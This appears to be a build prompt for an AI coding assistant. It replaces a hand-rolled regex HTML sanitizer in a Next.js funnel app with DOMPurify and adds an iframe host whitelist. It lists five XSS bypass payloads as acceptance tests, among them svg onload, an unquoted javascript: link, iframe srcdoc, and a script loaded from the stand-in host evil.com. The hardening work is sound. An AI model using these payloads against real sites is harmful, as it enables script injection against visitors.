# DeepSeek build prompt — Part 6b: harden the code-block sanitizer (+ 1 minor fix)

> Paste everything below the line into DeepSeek as a single build task. It is self-contained.
> Why: the Part 6 `code` block can render attacker HTML on the **public** `/f/[slug]` page (real visitors, lead capture). The current `lib/sanitize.ts` is a hand-rolled regex sanitizer with known XSS bypasses. Replace it with a vetted library. Plus one small default-action fix.

---

## Role

Senior Next.js engineer in the `kenzo` repo (Next.js App Router + TypeScript + Tailwind + Supabase + Vercel). Precise, working edits, never break the build.

## Hard rules

- Modified Next.js — read `node_modules/next/dist/docs/` before routing/rendering/server code.
- Never touch `node_modules`, `.next`, `next-env.d.ts`, `tsconfig.tsbuildinfo`.
- `lib/sanitize.ts` runs in BOTH a **server component** (`app/f/[slug]/page.tsx`) and a **client component** (`components/blocks/CodeBlock.tsx`), so the sanitizer must work in both — use an isomorphic library.
- Keep the public funnel page ISR and fast.

---

## MUST FIX — replace the regex sanitizer with DOMPurify

### Current bypasses (these must all be neutralized after the fix)
1. `<svg/onload=alert(1)>` — handler strip needs whitespace before `on`; `/` defeats it.
2. `<a href=javascript:alert(1)>click</a>` — only *quoted* `javascript:` is stripped; unquoted runs.
3. `<iframe src="https://youtube.com" srcdoc="<script>alert(1)</script>"></iframe>` — whitelisted iframe is kept verbatim, so `srcdoc` executes same-origin.
4. `<script src="//evil.com/x.js">` with no closing tag — regex requires `</script>`.
5. `<object data="...">`, `<embed>`, `<base href="javascript:...">`, `<style>@import…</style>`, `data:text/html` URLs — not handled at all.

### Steps
1. Install: `npm i isomorphic-dompurify` (works in Node server + browser).
2. Rewrite `lib/sanitize.ts` to use it. Keep the existing `ALLOWED_IFRAME_HOSTS` whitelist and enforce it as a **post-pass** on the sanitized output (DOMPurify allows the `<iframe>` tag; we still must restrict its `src` host ourselves):

```ts
import DOMPurify from 'isomorphic-dompurify'

const ALLOWED_IFRAME_HOSTS = [
  'youtube.com', 'www.youtube.com', 'youtube-nocookie.com', 'www.youtube-nocookie.com',
  'vimeo.com', 'player.vimeo.com', 'calendly.com', 'typeform.com',
]

function hostAllowed(src: string): boolean {
  try {
    const host = new URL(src).hostname.toLowerCase()
    return ALLOWED_IFRAME_HOSTS.some(h => host === h || host.endsWith('.' + h))
  } catch { return false }
}

export function sanitizeHtml(html: string): string {
  // 1. Vetted sanitize. Allow iframes but never srcdoc; force https iframe src only.
  const clean = DOMPurify.sanitize(html, {
    ADD_TAGS: ['iframe'],
    ADD_ATTR: ['allow', 'allowfullscreen', 'frameborder', 'scrolling'],
    FORBID_TAGS: ['script', 'object', 'embed', 'base', 'form'],
    FORBID_ATTR: ['srcdoc'],
    ALLOWED_URI_REGEXP: /^(?:https?:|mailto:|tel:|#|\/)/i, // kills javascript:/data:
  })

  // 2. Post-pass: drop any iframe whose src host is not whitelisted.
  if (typeof window === 'undefined') {
    // server: regex post-filter (no DOM)
    return clean.replace(/<iframe\b[^>]*>(?:[\s\S]*?<\/iframe>)?/gi, (m) => {
      const src = (m.match(/\bsrc\s*=\s*"([^"]*)"/i)?.[1]) ?? ''
      return hostAllowed(src) ? m : '<!-- iframe removed -->'
    })
  }
  // client: DOM post-filter
  const doc = new DOMParser().parseFromString(clean, 'text/html')
  doc.querySelectorAll('iframe').forEach(f => {
    if (!hostAllowed(f.getAttribute('src') ?? '')) f.remove()
  })
  return doc.body.innerHTML
}
```

3. Do **not** change the call sites — `app/f/[slug]/page.tsx` and `components/blocks/CodeBlock.tsx` already import `sanitizeHtml`; they keep working. Confirm both still compile.
4. Keep the editor path (`trusted=true` in `CodeBlock`) rendering raw, unchanged — sanitizing is published-only.

### Acceptance
- Each of the 5 payloads above, passed through `sanitizeHtml`, produces output with **no** executable script, no `on*` handler, no `javascript:`/`data:` URL, no `srcdoc`, and only whitelisted-host iframes.
- A legit `<iframe src="https://www.youtube.com/embed/abc"></iframe>` is **kept**.
- `npm run build` green. Page still server-renders (no `window` crash — note the `typeof window` branch).

---

## MINOR FIX — wrong default action in the non-streaming fallback

`components/editor/AiBuilderPanel.tsx`, in the non-streaming `else` branch (~line 224):

```ts
const action = data.action || 'edit'   // ← wrong: defaults to editing
```
Change the default to `'talk'` so a missing/unknown action never silently edits the funnel (matches the streaming path and the route's safe default):
```ts
const action = data.action || 'talk'
```
No other behavior changes.

## Out of scope
Anything beyond `lib/sanitize.ts`, its dependency, and that one line in `AiBuilderPanel.tsx`.
